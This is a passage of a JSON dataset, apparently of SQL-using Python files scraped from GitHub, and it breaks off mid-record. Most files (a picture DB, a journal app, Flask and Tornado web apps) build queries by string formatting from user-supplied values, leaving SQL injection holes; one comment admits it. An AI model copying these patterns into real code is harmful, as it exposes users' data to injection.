file\n\t\t:return: string\n\t\t\"\"\"\n\t\tif self.fileExists(pth):\n\t\t\tcommand = \"SELECT meta FROM {0} where path='{1}';\".format(TABLE_NAME, pth)\n\t\t\tdata = self._run_command(command)\n\t\t\ttry:\n\t\t\t\tdata = data[0][0]\n\t\t\texcept IndexError:\n\t\t\t\tdata = None\n\t\telse:\n\t\t\tprint(\"getMetadata: file doesn't exist!\")#debug\n\t\t\tdata = None\n\n\t\treturn data\n\n\tdef getFileList(self):\n\t\t\"\"\"\n\t\tReturns the list of all files (paths) in DB\n\t\t:return: string\n\t\t\"\"\"\n\t\tcommand = \"SELECT path FROM {0};\".format(TABLE_NAME)\n\t\tdata = self._run_command(command)\n\t\ttry:\n\t\t\tdata = [i[0] for i in data]\n\t\texcept IndexError:\n\t\t\tdata = None\n\n\t\treturn data\n\n\tdef getFileListPics(self):\n\t\t\"\"\"\n\t\tReturns the list of all picture files (paths) (type 0) in DB\n\t\t:return: string\n\t\t\"\"\"\n\t\tcommand = \"SELECT path FROM {0} WHERE type=0;\".format(TABLE_NAME)\n\t\tdata = self._run_command(command)\n\t\ttry:\n\t\t\tdata = [i[0] for i in data]\n\t\texcept IndexError:\n\t\t\tdata = None\n\n\t\treturn data\n\n\tdef deleteFile(self, pth):\n\t\t\"\"\"\n\t\tDeletes file with a given path from the DB. If it doesn't exist, ignores.\n\t\t:param pth:\n\t\t:return:\n\t\t\"\"\"\n\t\tcommand = \"DELETE FROM {0} WHERE path='{1}';\".format(TABLE_NAME, pth)\n\t\tself._run_command(command)\n\n\tdef updateCacheID(self, pth, cacheID):\n\t\t\"\"\"\n\t\tUpdates the file_id field to a given value\n\t\t:param pth:\n\t\t:param cacheID:\n\t\t:return:\n\t\t\"\"\"\n\t\tcommand = \"UPDATE {0} SET file_id='{1}' WHERE path='{2}'\".format(TABLE_NAME, cacheID, pth)\n\t\tself._run_command(command)\n\n\tdef getFileCacheID(self, pth):\n\t\t\"\"\"\n\t\tReturns ID of a cached file on Telegram from DB. None if file doesn't exist or has no cached ID.\n\t\t:param pth:\n\t\t:return:\n\t\t\"\"\"\n\t\tcommand = \"SELECT file_id FROM {0} WHERE path='{1}'\".format(TABLE_NAME, pth)\n\t\tdata = self._run_command(command)\n\n\t\ttry:\n\t\t\tdata = data[0][0]\n\t\texcept IndexError:\n\t\t\tdata = None\n\n\t\treturn data\n\n\tdef invalidateCached(self, pth):\n\t\t\"\"\"\n\t\tSet cache to NULL in DB for a given file\n\t\t:param pth:\n\t\t:return:\n\t\t\"\"\"\n\t\tcommand = \"UPDATE {0} SET file_id=NULL WHERE path='{1}'\".format(TABLE_NAME, pth)\n\t\tself._run_command(command)\n\n\tdef getCaption(self, pth):\n\t\t\"\"\"\n\t\tReturns a metadata for a given metadata file from DB.\n\t\t:param pth: path to a *metadata* file\n\t\t:return:\n\t\t\"\"\"\n\t\tcommand = \"SELECT meta FROM {0} WHERE path='{1}';\".format(TABLE_NAME,pth)\n\t\tdata = \tself._run_command(command)\n\n\t\ttry:\n\t\t\tdata = data[0][0]\n\t\texcept IndexError:\n\t\t\tdata = None\n\n\t\treturn data\n\n\tdef getCaptionPic(self, pth):\n\t\t\"\"\"\n\t\tReturns a metadata for a given picture file From DB.\n\t\tUnlike `getCaption`, it gets the folder based on path to pic automatically.\n\t\t:param pth: path to a *picture* file\n\t\t:return:\n\t\t\"\"\"\n\t\tpth = path.join(path.dirname(pth), METADATA_FILENAME)\n\t\tdata = self.getCaption(pth)\n\n\t\treturn data\n\n\nif __name__ == '__main__':\n\tdb = FileDB(\"file_db_test\")\n\tprint(db.fileExists(\"/abc/001.jpg\"))#False\n\tdb.addFile(\"/abc/001.jpg\")\n\tdb.addFile(\"/abc/002.jpg\", mod_time=1001)\n\tdb.addFile(path.join(SCRIPT_FOLDER,'tests/test_pics/pic3.jpg'))\n\tprint(db.fileExists(\"/abc/001.jpg\"))#True\n\n\tprint(db.getModTime(\"/abc/001.jpg\"))#0\n\tprint(db.getModTime(\"/abc/002.jpg\"))#1001\n\tprint(db.getModTime(\"/abc/003.jpg\"))#None\n\tprint(db.getModTime(path.join(SCRIPT_FOLDER,'tests/test_pics/pic3.jpg')))#Big integer\n\n\tdb.updateModTime(\"/abc/001.jpg\", 42000)\n\tprint(db.getModTime(\"/abc/001.jpg\"))#42000\n\tprint(db.getModTime(\"/abc/404.jpg\"))#None\n\n\tdb.addMetafile(path.join(\"/abc/\", METADATA_FILENAME), \"Nothing\\nReally,nothing!\", 3333)\n\tprint(db.getMetadata(path.join(\"/abc/\", METADATA_FILENAME)))#Nothing really\n\tdb.updateMetadata(path.join(\"/abc/\", METADATA_FILENAME), \"Something\\nSomething already!\", 9999)\n\tprint(db.getMetadata(path.join(\"/abc/\", METADATA_FILENAME)))#Something already!\n\tdb.addMetafile(path.join(\"/xyz/\", METADATA_FILENAME),\n\t\t\t\t\"\"\"ejeaotun.w\"n65wnn.w6wi9uy4w'w45mn5o4bu..ehe\\nwgH\\tehbae\\reaiomb\"\"\", 11111)\n\tprint(db.getMetadata(path.join(\"/xyz/\", METADATA_FILENAME)))#gibberish\n\n\tprint(db.getMetadata(path.join(\"/ac/\", METADATA_FILENAME)))#None\n\n\tdb.updateCacheID('/abc/001.jpg','AgADAgADzbExGwXC2QezXXRbQpfP3F7JgioABAQl8awcYOsqLrsBAAEC')\n\tdb.updateCacheID('/xxxxx/xxx.jpg','AgADAgADzbExGwXC2QezXXRbQpfP3F7JgioABAQl8awcYOsqLrsBAAEC')#try to set cache to nonexisting file\n\tprint(\"getFileCacheID /abc/001.jpg\", db.getFileCacheID('/abc/001.jpg'))#AgADAgADzbExGwXC2QezXXRbQpfP3F7JgioABAQl8awcYOsqLrsBAAEC\n\tprint(\"getFileCacheID /abc/002.jpg\", db.getFileCacheID('/abc/002.jpg'))#try to get cache of a file that has no cache yet\n\tprint(\"getFileCacheID /xxxxx/xxx.jpg\", db.getFileCacheID('/xxxxx/xxx.jpg'))#try to get cache of nonexisting file\n\tdb.invalidateCached('/xxxxx/xxx.jpg')#invalidate nonexisting file\n\tdb.invalidateCached('/abc/001.jpg')\n\tprint(\"getFileCacheID /abc/001.jpg\", db.getFileCacheID('/abc/001.jpg'))#None\n\n\tprint(db.getFileList())#lists all files\n\tdb.deleteFile('/abc/001.jpg')\n\tprint(db.getFileList())#lists all files without '/abc/001.jpg\n\tdb.deleteFile('/xxxxx/xxx.jpg')# try deleting non-existing file\n\tprint(db.getFileList())#lists all files without '/abc/001.jpg\n\tprint(db.getFileListPics())#returns only pictures. No metadata files\n\n\t# Remove the test DB file\n\t# os.remove(db.getDBFilename())",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/peterlebrun/jdk/blob/ea0372f17a4d8ffee1bc2438057ac614e72c6b44",
        "file_path": "/entry.py",
        "source": "import re\nimport subprocess\nimport sqlite3\n\nDB_FILE = '/home/peter/projects/jdk/db/jdk_entries.db'\nCURRENT_DATESTAMP = \"DATETIME(CURRENT_TIMESTAMP, 'localtime')\" # special sqlite3 syntax\nTEMP_FILE = '/home/peter/projects/jdk/db/temp.jdk'\n\ndef db_execute(sql, expect_return_values=False):\n  db_connection = sqlite3.connect(DB_FILE) \n  db_cursor = db_connection.cursor()\n  db_cursor.execute(sql)\n  \n  if (expect_return_values):\n    return_values = db_cursor.fetchall()\n  else:\n    return_values = None\n    db_connection.commit()\n\n  db_connection.close()\n\n  return return_values  \n\nclass Entry:\n\n  entry_id = None\n  title = None\n  body = None\n  date_created = None\n  date_last_modified = None\n  writeable = True \n\n  def __init__(self, entry_id=None, title=None, writeable=True):\n    \n    if (entry_id):\n      self.entry_id = entry_id \n      self.populate_entry_data()\n      self.writeable = writeable\n\n    else:\n      self.create_entry()\n      self.set_entry_id()\n\n      if(title):\n        self.title = title\n        self.update_title()\n\n  @staticmethod\n  def get_home_screen_data():\n    sql = \"SELECT jdk_entries.id, jdk_entries.title \" + \\\n      \"FROM jdk_entries \" + \\\n      \"ORDER BY date_last_modified DESC \" + \\\n      \"LIMIT 30;\" \n\n    return db_execute(sql, True)\n\n  @staticmethod\n  def search_existing_entries(keyword=None, from_date=None, to_date=None):\n    total_parameters = 0\n\n    if (keyword):\n      keyword_string = \"(jdk_entries.title LIKE '%\" + keyword + \"%' OR \" + \\\n        \"jdk_entries.body LIKE '%\" + keyword + \"%') \"\n      total_parameters += 1\n    else:\n      keyword_string = \"\"  \n  \n    if (from_date):\n      from_date_string = \"jdk_entries.date_last_modified >= '\" + from_date + \"' \"\n      total_parameters += 1\n    else:\n      from_date_string = \"\"\n\n    if (to_date):\n      to_date_string = \"jdk_entries.date_last_modified <= '\" + to_date + \"' \"\n      total_parameters += 1\n    else:\n      to_date_string = \"\"\n\n    sql = \"SELECT jdk_entries.id, jdk_entries.title \" + \\\n      \"FROM jdk_entries \" + \\\n      \"WHERE \" + \\\n      keyword_string + \\\n      (\"AND \" if (keyword_string and (from_date or to_date)) else \"\") + \\\n      from_date_string + \\\n      (\"AND \" if (from_date and to_date) else \"\") + \\\n      to_date_string + \\\n      \"LIMIT 30;\"\n\n    return db_execute(sql, True)\n\n  def populate_entry_data(self):\n    sql = \"SELECT jdk_entries.title, jdk_entries.body \" + \\\n      \"FROM jdk_entries \" + \\\n      \"WHERE jdk_entries.id = \" + self.entry_id + \";\" \n\n    self.title, self.body = db_execute(sql, True)[0] # returns array\n    \n    return None\n  \n  def create_entry(self):\n    sql = \"INSERT INTO jdk_entries \" + \\\n      \"(title, body,  date_created, date_last_modified)\" + \\\n      \"VALUES ('', '', \" + CURRENT_DATESTAMP + \\\n      \", \" + CURRENT_DATESTAMP + \");\"\n\n    db_execute(sql)\n\n    return None\n\n  def set_entry_id(self):\n    sql = \"SELECT MAX(id) FROM jdk_entries;\"\n\n    # returns a nested list, need to get at it with array syntax\n    self.entry_id = str(db_execute(sql, True)[0][0]);     \n\n    return None\n\n  def update_title(self, title = None):\n    if (not self.title):\n      self.title = title\n\n    # This will fall to a sql injection \n    sql = \"UPDATE jdk_entries SET title = '\" + self.title + \"'\" + \\\n          \"WHERE jdk_entries.id = '\" + self.entry_id + \"';\" \n\n    db_execute(sql)\n    \n    self.update_date_modified()\n\n    return None\n\n  def update_date_modified(self):\n    sql = \"UPDATE jdk_entries \" + \\\n      \"SET date_last_modified = \" + CURRENT_DATESTAMP + \" \" + \\\n      \"WHERE jdk_entries.id = '\" + self.entry_id + \"';\"\n    \n    db_execute(sql)\n\n    return None\n\n  def edit_entry(self):\n    self.create_temp_file()\n    if (self.body is not None):\n      self.write_body_to_temp_file() \n    \n    self.open_temp_file() # opens vim here\n    \n    body_new = self.get_temp_file_data()\n  \n    if (body_new != self.body):\n      self.body = body_new \n    \n      sql = \"UPDATE jdk_entries \" + \\\n        \"SET body = '\" + self.body + \"' \" + \\\n        \"WHERE jdk_entries.id = '\" + self.entry_id + \"';\"\n\n      db_execute(sql)\n      self.update_date_modified()\n    \n    self.remove_temp_file()\n    \n    return None\n\n  def create_temp_file(self):\n    subprocess.call(['touch', TEMP_FILE])\n\n    return None\n\n  def write_body_to_temp_file(self):\n    temp_file = open(TEMP_FILE, \"w\")\n    temp_file.write(self.body)  \n    temp_file.close()\n\n    return None\n\n  def open_temp_file(self):\n    params = ['vim', TEMP_FILE]\n\n    if (not self.writeable):\n      params.insert(1, '-R') # vim syntax for read only\n\n    subprocess.call(params)\n\n    return None\n\n  def get_temp_file_data(self):\n    temp_file = open(TEMP_FILE, \"r\")\n    temp_text = temp_file.read()  \n    temp_file.close()\n\n    return temp_text\n\n  def remove_temp_file(self):\n    params = ['rm', TEMP_FILE]\n\n    subprocess.call(params)\n    \n    return None\n  \n  def export_entry(self, location = None):\n    if (not location):\n      export_location = \"/home/peter/Desktop/\" + str(self.entry_id) + \".txt\"\n      #subprocess.call(['touch', export_location])\n      export_file = open(export_location, \"w\")\n      #export_file.write(\"Date Created \" + self.date_created)\n      #export_file.write(\"Date Last Modified \" + self.date_last_modified)\n      export_file.write(\"id \" + str(self.entry_id) + \"\\n\")\n      export_file.write(\"title \" + self.title + \"\\n\")\n      export_file.write(self.body)\n      export_file.close()\n\n    return None\n\"\"\"\nEntry has:\n  title\n  body\n  id\n  date created\n  date modified\n  file location\n\nEntry needs\n  set title (saved in DB)\n  create file (touch)\n  open file (w vim)\n  update date modified (in DB)\n  create entry meta data (in DB)\n\"\"\" \n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/rpinho/happy.li/blob/ea7a4c7162e19f7bbc3a2a09c8b743dc376b9125",
        "file_path": "/model.py",
        "source": "import locale\nfrom pandas.io import sql\nimport MySQLdb as mdb\nfrom pandas.compat.scipy import percentileofscore\n\nlocale.setlocale(locale.LC_ALL, 'en_US.UTF-8' )\n\njob1 = 'Data Scientist'\njob2 = 'Piping Engineer'\ncolumns = [u'salary_sum', u'salary_diff', u'adj_salary',\n           #u'mean_household_income',\n           u'n_sum', u'n_diff']\nweights = [0, 0, 0.4, 0.6, -0.3]\nweights = dict(zip(columns, weights))\n#weights = {'salary_f': 0.8, 'n1_f': 0.1, 'n2_f': 0.1}\njobs_table = 'jobs_cities2'\ncities_table = 'cities3'\ndb = mdb.connect(user=\"root\", host=\"localhost\", port=3306, db=\"demo\")\nnan_values = {'job1':'', 'job2':'', 'salary1':0, 'salary2':0, 'n1':0, 'n2':0,\n              'description':'', 'image_url':''}\n\nquery = \"\"\"\nselect p1.job as job1, p2.job as job2,\n    p.city, p.state,\n    j1.salary as salary1, j2.salary as salary2,\n    COALESCE(j1.salary + j2.salary, j1.salary, j2.salary) as salary_sum,\n    COALESCE(abs(j1.salary - j2.salary), j1.salary, j2.salary) as salary_diff,\n    c.mean_household_income,\n    COALESCE(j1.salary + j2.salary - c.mean_household_income,\n        j1.salary - c.mean_household_income,\n        j2.salary - c.mean_household_income) as adj_salary,\n    n1, n2, n_sum,\n    COALESCE(abs(n1 - n2), n1, n2) as n_diff,\n    c.latitude, c.longitude, c.url as image_url, c.description\nfrom\n    (select city, state, formattedLocation, count(*) as n_sum\n    from postings\n    where job in ('%(job1)s', '%(job2)s')\n    group by formattedLocation) as p\n    left outer join\n    (select job, city, state, formattedLocation, count(*) as n1\n    from postings\n    where job = '%(job1)s'\n    group by formattedLocation) as p1\n    on p.formattedLocation = p1.formattedLocation\n    left outer join\n    (select job, city, state, formattedLocation, count(*) as n2\n    from postings\n    where job = '%(job2)s'\n    group by formattedLocation) as p2\n    on p.formattedLocation = p2.formattedLocation\n    left outer join\n    (select city, state, salary\n    from jobs_cities2\n    where job = '%(job1)s') as j1\n    on p1.city = j1.city and p1.state = j1.state\n    left outer join\n    (select city, state, salary\n    from jobs_cities2\n    where job = '%(job2)s') as j2\n    on p2.city = j2.city and p2.state = j2.state\n    inner join cities4 c\n    on p1.city = c.city and p1.state = c.state\norder by adj_salary, salary_sum, n_sum, salary_diff, n_diff;\n\"\"\"\n\ndef get_cities(job1=job1, job2=job2, weights=weights, query=query,\n               jobs_table=jobs_table, cities_table=cities_table, db=db):\n\n    print job1, job2\n\n    # query db\n    df = sql.frame_query(query %locals(), db)\n\n    # NaN\n    df.fillna(nan_values, inplace=True)\n\n    # some more transformations I could not implement in mySQL\n    #df['salary_f'] = df.adj_salary - df.adj_salary.min()\n    #df['salary_f'] = df.salary_f / df.salary_f.sum()\n\n    for name in weights.keys():\n        df[name] = df[name].apply(lambda x: percentileofscore(df[name], x)/100)\n\n    # compute weighted average\n    score = 0\n    for key, value in weights.items():\n        score += df[key]*value\n    df['score'] = score\n\n    df.job1 = job1\n    df.job2 = job2\n    df = format_output_columns(df)\n    df = get_query_url(df)\n\n    return df.sort('score', ascending=False)\n\ndef format_output_columns(df):\n    # ints\n    columns = ['salary1', 'salary2', 'mean_household_income', 'n1', 'n2']\n    df[columns] = df[columns].astype(int)\n    # currency\n    columns = ['salary1', 'salary2', 'mean_household_income']\n    def moneyfmt(x): return locale.currency(x, True, True) if x else ''\n    df['salary1_$'] = df.salary1.apply(moneyfmt)\n    df['salary2_$'] = df.salary2.apply(moneyfmt)\n    df['mean_household_income_$'] = df.mean_household_income.apply(moneyfmt)\n    return df\n\ndef get_query_url(df):\n    API = 'http://www.indeed.com/jobs?'\n    query1 = 'q=' + df.job1 + '&l=' + df.city + ' ' + df.state\n    #query1 = query1.strip().lower().replace(' ','+')\n    df['query_url1'] = API + query1\n    query2 = 'q=' + df.job2 + '&l=' + df.city + ' ' + df.state\n    df['query_url2'] = API + query2\n    return df\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/rpinho/happy.li/blob/ea7a4c7162e19f7bbc3a2a09c8b743dc376b9125",
        "file_path": "/myapp.py",
        "source": "import model\nimport os, json\nfrom flask import Flask, render_template, request\nimport MySQLdb as mdb\n\napp = Flask(__name__)\ndb = mdb.connect(user=\"root\", host=\"localhost\", port=3306, db=\"demo\")\ncities_table = 'cities4'\nJOBS_TABLE = 'postings'#jobs_cities2'\n#weights = {'salary_f': 0.6, 'n1_f': 0.2, 'n2_f': 0.2}\noutput = ['city', 'latitude', 'longitude', 'image_url', 'description']\nn_cities = 10\n\n@app.route(\"/\")\ndef hello():\n    return render_template('index.html')\n\n@app.route(\"/slideshow\")\ndef slideshow():\n    return render_template('slideshow.html')\n\n@app.route(\"/_exp\")\ndef exp():\n    #keys = ['url', 'name', 'description', 'image_url', 'count', 'nbackers',\n     #          'count', 'prediction']\n    #results = [dict(zip(keys, ['%d'%i]*len(keys))) for i in range(1,4)]\n    df = model.get_cities().reset_index()\n    results = df.T.to_dict().values()[:n_cities]\n    return render_template('exp_cards.html', results=results)\n    #return render_template('exp_sliders.html', results=results)\n\n@app.route('/maps')\ndef maps():\n    job1 = request.args.get('job1', None, type=str)\n    job2 = request.args.get('job2', None, type=str)\n    return render_template('maps.html', job1=job1, job2=job2)\n\n@app.route('/results')\ndef results():\n    job1 = request.args.get('job1')\n    job2 = request.args.get('job2')\n    df = model.get_cities(job1, job2).reset_index()\n    results = df.T.to_dict().values()[:n_cities]\n    return render_template('results.html', results=results)\n\n@app.route('/waypoints')\ndef waypoints():\n    job1 = request.args.get('job1', None, type=str)\n    job2 = request.args.get('job2', None, type=str)\n    df = model.get_cities(job1, job2)#, weights, jobs_table, cities_table, db)\n    df = df.reset_index()#df = df[output].head(n_cities)\n    cities = []\n    for i in range(n_cities):\n        cities.append({i: (df.ix[i, 'city'],\n                           df.ix[i, 'latitude'], df.ix[i, 'longitude'],\n                           df.ix[i, 'image_url'], df.ix[i, 'description'])})\n    print cities\n    return json.dumps(cities)\n    #return cities.to_json(orient='split')#json.dumps(list(cities))#address)\n\ndef jobs(table=JOBS_TABLE):\n    \"\"\"Return list of projects.\"\"\"\n    query = 'select job from %s group by job' %table\n    df = model.sql.frame_query(query, db)\n    return json.dumps(df.job.values.tolist())\n\n# I have a dictionary that holds functions\n# that respond to json requests\nJSON = {\n    'jobs': jobs,\n    'job1': jobs,\n    'job2': jobs\n}\n\n# jobs function is called here\n@app.route(\"/json/<what>\")\ndef ajson(what):\n\n    return JSON[what]()\n\n@app.route('/<pagename>')\ndef regularpage(pagename=None):\n    \"\"\"\n    Route not found by the other routes above. May point to a static template.\n    \"\"\"\n    return \"You've arrived at \" + pagename\n    #if pagename==None:\n    #    raise Exception, 'page_not_found'\n    #return render_template(pagename)\n\nif __name__ == '__main__':\n    print \"Starting debugging server.\"\n    app.run(debug=True, host='localhost', port=8000)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Legionaires/classic/blob/9a2bcc7b8044a89e8ddb70a05260cf3ac550917e",
        "file_path": "/classic.py",
        "source": "#!/usr/bin/env python\n\nimport MySQLdb\nimport tornado.httpserver\nimport tornado.web\nimport os.path\nimport json\nimport tornado.escape\n\n\"\"\"\nIdeally each endpoint will work for JSON and HTML.  JSON first\n\"\"\"\n\nroot_url = \"undefined\"\nserver_port = 0\n\n\n\nclass Application(tornado.web.Application):\n\tdef __init__(self):\n\t\tglobal root_url, server_port\t\t\n\t\tconfig_file = open(\"config.json\").read()\n\t\tconfig_data = json.loads(config_file)\n\t\troot_url = config_data[\"server\"]\n\t\tserver_port = config_data[\"port\"]\n\n\t\thandlers = [\n\t\t\t(r\"/main\", MainHandler),\n\t\t\t(r\"/count\", CountHandler),\n\t\t\t(r\"/\", tornado.web.RedirectHandler, dict(url=r\"/main\")),\n\t\t\t(r\"/([a-z]+)\", DatabaseHandler),\n\t\t\t(r\"/([a-z]+)/([0-9]+)\",ForumHandler),\n\t\t\t(r\"/([a-z]+)/([0-9]+)/([0-9]+)\",ThreadHandler), \n\t\t]\n\t\tsettings = dict(\n\t\t\ttemplate_path=os.path.join(os.path.dirname(__file__), \"templates\"),\n\t\t)\n\t\tsuper(Application, self).__init__(handlers, **settings)\n\t\tself.db = MySQLdb.connect(db=config_data[\"database\"], \n\t\t\t\t\t\tuser=config_data[\"user\"],\n\t\t\t\t\t\tpasswd=config_data[\"passwd\"])\n\n\t\tself.databases = config_data[\"databases\"] \n\n\t\n\"\"\"  Ideally, we should be able to have each give direct json or wrap in html\"\"\"\nclass HandlerBase(tornado.web.RequestHandler):\n\t\n\tdef prefix(self, name):\n\t\tfor d in self.application.databases:\n\t\t\tif d[\"url\"] == name:\n\t\t\t\treturn d[\"data_prefix\"]\n\t\tself.setstatus(404)\t\n\t\treturn \"\"\n\n\tdef username(self, user_id):\n\t\tc = self.application.db.cursor()\n\t\tc.execute(\"SELECT pn_uname FROM pn_users WHERE pn_uid=%s\", (user_id,))\n\t\trow = c.fetchone()\n\t\tif row:\n\t\t\treturn row[0].decode('latin1').encode('utf8')\n\t\telse:\n\t\t\treturn \"Unknown\"\t\n\n\tdef write_json_or_html(self, json_data):\n\t\tif(\"text/html\" in self.request.headers[\"accept\"]):\n\t\t\tself.write_html(json_data)\t\n\t\telse:\n\t\t\tself.write(json_data)\n\n\tdef write_html(self, json_data):\n\t\t#subclass this method!\n\t\tpass\n\t\nclass MainHandler(HandlerBase):\n\tdef get(self):\n\t\tout = dict()\n\t\tdbs = []\n\t\tfor d in self.application.databases:\n\t\t\tdbs.append({\"name\":d[\"name\"], \"url\":root_url + d[\"url\"]})\n\t\tout[\"databases\"] = dbs\n\t\tself.write_json_or_html(out)\n\t\n\tdef write_html(self, json_data):\n\t\tself.render(\"dblist.html\", dbs=json_data[\"databases\"])\n\n\n\nclass DatabaseHandler(HandlerBase):\n\tdef get(self, db):\n\t\tprefix = self.prefix(db)\n\t\tif prefix:\n\t\t\tc = self.application.db.cursor()\n\t\t\tc.execute(\"SELECT forum_id, forum_name, forum_desc FROM %s_forums\" % prefix)\n\t\t\tout = {}\n\t\t\tforum_list = []\n\t\t\tfor row in c.fetchall():\n\t\t\t\tforum_name = row[1].decode('latin1').encode('utf8')\n\t\t\t\tforum_desc = row[2].decode('latin1').encode('utf8')\n\t\t\t\tforum_list.append({\"name\":forum_name, \"description\":forum_desc,\"url\":root_url+db+\"/\"+str(row[0])})\n\t\t\tout[\"forums\"] = forum_list\n\t\t\tself.write_json_or_html(out)\n        \n        def write_html(self, json_data):\n\t\tself.render(\"database.html\", forums=json_data[\"forums\"])\t\n\n\nclass ForumHandler(HandlerBase):\n\tdef get(self, db, forum_id):\n\t\tprefix = self.prefix(db)\n\t\tif prefix:\n\t\t\tout = {}\n\t\t\tthread_list = []\n\t\t\tc = self.application.db.cursor()\n\t\t\tselect_table = \"SELECT forum_id, topic_title, topic_id, topic_poster FROM %s\" % prefix + \"_topics\"\n\t\t\tselect_text = select_table + \" WHERE forum_id=%s ORDER BY topic_id\"\n\t\t\tc.execute(select_text, (forum_id,))\n\t\t\tfor row in c.fetchall():\n\t\t\t\ttitle = row[1].decode('latin1').encode('utf8')\n\t\t\t\tthread_list.append({\"title\":title, \"creator\":self.username(row[2]),  \"url\":root_url+db+\"/\"+forum_id+\"/\"+str(row[2])})\n\t\t\tout[\"threads\"] = thread_list\n                        self.write_json_or_html(out)\n\n        def write_html(self, json_data):\n\t\tself.render(\"forum.html\", threads=json_data[\"threads\"])\n\n\nclass ThreadHandler(HandlerBase):\n\tdef get(self, db, forum_id, topic_id):\n\t\tprefix = self.prefix(db)\n\t\tif prefix:\n\t\t\tout = {}\n\t\t\tpost_list = []\n\t\t\tc = self.application.db.cursor()\n\t\t\t\n\t\t\tselect_table_one = prefix + \"_posts\"\n\t\t\tselect_table_two = prefix + \"_posts_text\"\n\t\t\t\n\t\t\tselect_tables = \"SELECT %s.post_id, poster_id, post_subject, post_text FROM %s\" % (select_table_one, select_table_one)\n\t\t\tselect_join = \" INNER JOIN %s ON %s.post_id=%s.post_id\" % (select_table_two, select_table_one, select_table_two)\n\t\t\tselect_where = \" WHERE topic_id=%s ORDER BY post_id\"\n\t\t\tselect_statement = select_tables + select_join + select_where\n\t\t\tc.execute(select_statement, (topic_id,))\n\t\t\tfor row in c.fetchall():\n\t\t\t\tsubject = row[2].decode('latin1').encode('utf8')\n\t\t\t\ttext = row[3].decode('latin1').encode('utf8')\n\t\t\t\tpost_list.append({\"subject\":subject, \"text\":text,\"poster\":self.username(row[1]), \"url\":root_url+db+\"/\"+forum_id+\"/\"+topic_id+\"/\"+str(row[0])})\n                        self.write_json_or_html({\"posts\":post_list})\n\n        def write_html(self, json_data):\n\t\tself.render(\"thread.html\", posts=json_data[\"posts\"])\n\t\n\n\nclass CountHandler(tornado.web.RequestHandler):\n\tdef get(self):\n\t\tc = self.application.db.cursor()\n\t\tc.execute(\"SELECT COUNT(*) FROM classic_posts\")\n\t\tself.render(\"count.html\", count=c.fetchone())\n\n\ndef main():\n\thttp_server = tornado.httpserver.HTTPServer(Application())\n\thttp_server.listen(server_port)\n\ttornado.ioloop.IOLoop.current().start()\n\nif __name__ == \"__main__\":\n\tmain()\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/staffordp/logs_analysis/blob/bdbf63feb0ee9d0fb0d62eff32a9b70c8f1d5326",
        "file_path": "/vagrant/news_report.py",
        "source": "#!/usr/bin/env python2\nimport psycopg2\nfrom datetime import datetime\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database news.  Returns a database\n    connection.\"\"\"\n    return psycopg2.connect(\"dbname=news\")\n\n\ndef reportTopArticles(amount):\n    \"\"\"Reports the top articles by visitors from the logs table.\n\n    Args:\n          amount: the number of rankings to return\n    \"\"\"\n    query = \"SELECT * FROM toparticles \" \\\n            \"ORDER BY hits DESC \" \\\n            \"LIMIT {0}\".format(amount)\n    c.execute(query)\n    rows = c.fetchall()\n\n    response = \"    Top {0} Articles by Views\\n\"  \\\n               \"-----------------------------\\n\".format(amount)\n    responseFooter = \"\"\n\n    for r in rows:\n        responseFooter += \"\\\"\" + str(r[0]) + \"\\\" -- \" + str(r[1]) + \" views\\n\"\n\n    response += responseFooter\n    print response\n    return response\n\n\ndef reportTopAuthors():\n    \"\"\"Reports the top authors by visitors added for each of their articles.\n    \"\"\"\n    query = \"SELECT * FROM authorsrank\"\n    c.execute(query)\n    rows = c.fetchall()\n\n    response = \"Author Rank by Article Views\\n\"  \\\n               \"-----------------------------\\n\"\n    responseFooter = \"\"\n\n    for r in rows:\n        responseFooter += str(r[0]) + \" -- \" + str(r[1]) + \" views\\n\"\n\n    response += responseFooter\n    print response\n    return response\n\n\ndef reportDailyErrors(x):\n    \"\"\"Reports the dates in which the logged errors exceed x percent that day\n    out of all logged visits.\n\n    Args:\n          x: the percentage of errors reported\n    \"\"\"\n\n    query = \"SELECT * from dailyerrors \" \\\n            \"WHERE \" \\\n            \"cast(errorcount as decimal) / cast(hitcount as decimal) * 100 >= {0}\" \\\n            .format(x)\n    c.execute(query)\n    rows = c.fetchall()\n\n    response = \"Dates With More Than {0}% Error Rate\\n\" \\\n               \"-----------------------------\\n\".format(x)\n\n    responseFooter = \"\"\n\n\n\n    for r in rows:\n        # date_object = datetime.strptime(r[0], '%m/%d/%Y')\n        date_object = r[0].strftime('%B %d, %Y')\n        responseFooter += str(date_object) + \" - \" + str(r[1]) + \" errors\\n\"\n\n    response += responseFooter\n    print response\n    return response\n\n\n# And here we go...\n# Connect to the database\nDB = connect()\nc = DB.cursor()\n\n# Method queries\nreportTopArticles(3)\nreportTopAuthors()\nreportDailyErrors(1)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RedeMocambos/baobaxia/blob/656f796a401af9219fa15c6495324a9439409288",
        "file_path": "/app/django-bbx/media/views.py",
        "source": "from os import path\nfrom datetime import datetime\nimport json\n\nfrom rest_framework import status\nfrom rest_framework.decorators import api_view, renderer_classes\nfrom rest_framework.response import Response\nfrom rest_framework.renderers import UnicodeJSONRenderer, BrowsableAPIRenderer\nfrom sorl.thumbnail import get_thumbnail\n\nfrom django.http import HttpResponseRedirect, HttpResponse\nfrom django.contrib.auth.models import User\nfrom django.db.models import Q\nfrom django.core.context_processors import csrf\nfrom django.template import Template, RequestContext\n\nfrom media.models import Media, generate_UUID\nfrom tag.models import Tag\nfrom media.serializers import MediaSerializer\nfrom media.models import getTypeChoices, getFormatChoices\nfrom bbx.settings import DEFAULT_MUCUA, DEFAULT_REPOSITORY\nfrom bbx.utils import logger\nfrom mucua.models import Mucua\nfrom repository.models import Repository\n\nredirect_base_url = \"/api/\"  # TODO: tirar / mover\n\n\n@api_view(['GET'])\ndef media_list(request, repository, mucua, args=None, format=None):\n    \"\"\"\n    List all medias, or search by terms\n    \"\"\"\n\n    if request.method == 'GET':\n        \"\"\"\n        list medias\n        \"\"\"\n\n        # pegando sessao por url\n        redirect_page = False\n\n        # REPOSITORIO: verifica se existe no banco, senao pega a default\n        if mucua == 'rede':\n            # get actual mucua for excluding it\n            this_mucua = 